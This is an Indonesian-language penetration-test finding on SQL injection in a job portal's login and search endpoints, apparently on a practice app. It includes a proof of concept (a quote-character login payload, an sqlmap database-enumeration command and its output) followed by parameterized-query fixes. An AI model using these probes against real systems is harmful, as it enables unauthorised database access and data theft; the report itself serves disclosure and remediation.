# Finding 02: SQL Injection

| Item | Detail |
|------|--------|
| **Kerentanan** | SQL Injection — Pada parameter login dan search |
| **Severity** |  Critical |
| **Skor CVSS** | 9.3 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`) |
| **Endpoint** | `POST /api/auth/login`<br>`GET /api/jobs/search?keyword=(payload)` |

---

## Deskripsi

Terjadi ketika input pengguna dimasukkan langsung ke dalam kueri database tanpa sanitasi atau parameterisasi. Hal ini memungkinkan pengguna tidak berwenang menyisipkan sintaks SQL tambahan untuk memanipulasi logika kueri yang dieksekusi oleh mesin database.

---

## Dampak

- **Kerahasiaan (Confidentiality):** Penyerang dapat membaca seluruh isi data sensitif di dalam database.
- **Integritas (Integrity):** Penyerang dapat mengubah, menambah, atau menghapus data penting.
- **Ketersediaan & Akses Sistem (Availability & RCE):** Penyerang berpotensi mematikan layanan database atau mengeksekusi perintah sistem operasi (Remote Code Execution) tergantung pada tingkat hak akses akun database.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Melakukan Login dengan menyisipkan tanda kutip ( `'` ) pada form username, dan ditemukan error database

**Request:**

```http
POST /api/auth/login HTTP/1.1
Host: jobportal.vulnapp.id
Content-Type: application/json

{
  "username": "'",
  "password": "testpassword"
}
```

**Response Error:**

```json
{
  "error": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1"
}
```

>  **[Capture Error Database]**

---

### Langkah 2 — Menggunakan request login untuk melakukan pengujian menggunakan SQLMap

**Command:**

```bash
sqlmap -r request.txt --batch --dbs
```

>  **[Capture Output SQLMap / Command Execution]**

---

### Langkah 3 — Berhasil menampilkan daftar database aplikasi

**Output SQLMap:**

```text
available databases [3]:
[*] information_schema
[*] jobportal_db
[*] mysql
```

>  **[Capture Result / Daftar Database]**

---

## Rekomendasi Perbaikan

- Gunakan **Parameterized Queries / Prepared Statements** untuk seluruh transaksi kueri database.
- Terapkan prinsip **Least Privilege** pada akun database yang digunakan oleh aplikasi.
- Lakukan **validasi tipe data dan sanitasi input (allowlist)** di sisi server (*server-side*).

### Contoh Implementasi Kode

```php
//  Gunakan Prepared Statement (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```javascript
//  Gunakan Parameterized Query (Node.js)
const [rows] = await db.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, password]
);
```